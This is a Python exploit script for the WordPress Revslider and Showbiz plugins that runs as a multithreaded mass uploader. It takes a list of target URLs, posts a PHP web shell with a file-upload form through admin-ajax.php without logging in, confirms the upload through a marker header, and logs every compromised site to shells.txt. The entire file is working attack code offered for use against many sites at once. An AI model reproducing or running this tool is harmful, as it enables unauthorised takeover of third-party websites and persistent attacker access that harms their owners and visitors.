#!/usr/bin/env python

# @package: WordPress Revslider/Showbiz Multithreaded Uploader
# @author: NULLpOint7r
# @home: http://www.sec4ever.com/home/
# @contact-me: seidbenseidok@gmail.com

# usage: python main.py list.txt
# shells saved in file 'shells.txt'
# good luck

import re, sys

try :
	import requests
except ImportError :
	print 'Error: please install requests library -> pip install requests'
	exit (-1)

from random import sample as rand
from urlnorm import norm as urlnorm
from threading import Thread
from Queue import Queue

requests.packages.urllib3.disable_warnings ()

# generate random string
def rand_str (len = None) :
	if len == None :
		len = 8

	return ''.join (rand ('abcdefghijklmnopqrstuvwxyz', len))

# run exploit
def exploit (url, plugin, shell = None) :
	if shell == None :
		shell = "<?php @set_time_limit(0);@header('null77: pOinter');?><form method='POST' enctype='multipart/form-data'><input type='file' name='f'/><input type='submit' value='up'/></form><?php echo @copy($_FILES['f']['tmp_name'],$_FILES['f']['name'])?'ok':'no';?>"

	filename = 'NULLpOint7r' + '__' + rand_str (5) + '.php'
	headers  = {
		'User-Agent' : 'Mozilla/5.0 (Windows NT 6.1; rv:36.0) Gecko/20100101 Firefox/36.0',
		'Accept'     : '*/*'
	}

	# 1 - upload shell
	post  = {
		'action' : plugin + '_ajax_action',
		'client_action' : 'update_plugin'
	}
	files = {
		'update_file' : (filename, shell, 'text/html')
	}
	requests.post (url + 'wp-admin/admin-ajax.php', verify = False, headers = headers, data = post, files = files)

	# 2 - check if uploaded
	uploader = url + 'wp-content/plugins/' + plugin + '/temp/update_extract/' + filename
	res      = requests.head (uploader, verify = False, headers = headers)

	if 'null77' in res.headers :
		open ('shells.txt', 'a').write (uploader + '\n')
		return True

	return False

def start_worker () :
	while True :
		try :
			url = urlnorm (q.get ())

			if exploit (url, 'revslider') :
				sys.stdout.write (url + ' <---------- Hacked\n')
			elif exploit (url, 'showbiz') :
				sys.stdout.write (url + ' <---------- showbiz\n')
			else :
				sys.stdout.write (url + '\n')
		except :
			pass

		q.task_done ()

NUMBER_OF_THREADS = 25
q = Queue ()

# start threads
for i in range (NUMBER_OF_THREADS) :
	t = Thread (target = start_worker)
	t.daemon = True
	t.start ()

if len (sys.argv) > 1 :
	try :
		file = open (sys.argv[1])
	except IOError :
		print 'Error: file not found'
		exit (-1)

	for url in file :
		q.put (url.strip ())

	q.join () # block until all threads are done
else :
	print '\n\tUsage: python ' + sys.argv[0] + ' list.txt'

# [2015-03-15 ~ www.sec4ever.com]
